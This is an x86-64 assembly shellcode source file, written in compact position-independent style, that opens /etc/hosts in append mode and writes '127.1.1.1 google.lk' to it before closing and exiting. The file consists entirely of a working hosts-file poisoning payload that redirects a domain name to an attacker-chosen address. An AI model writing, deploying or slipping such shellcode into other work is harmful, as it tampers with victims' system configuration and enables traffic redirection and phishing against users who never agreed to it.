section .text
	global _start

_start:

	jmp legit_start
	google db "127.1.1.1 google.lk"
	file db "/etc/hosts",0x00

legit_start:

	; open a file
	xor rax, rax 
	add rax, 2  ; open syscall
	xor rdi, rdi
	lea rdi, [rel file] ; load relative addr of file
	xor rsi, rsi
	add si, 0x401 ; file perms
	syscall

	; write 
	xchg rax, rdi
	xor rax, rax
	add rax, 1 ; syscall for write
	lea rsi, [rel google]
	mov dl, 19 ; This is the length of the string.
	syscall

	;close
	xor rax, rax
	add rax, 3
	syscall

	;exit
	xor rax, rax
	mov al, 60
	xor rdi, rdi
	syscall 
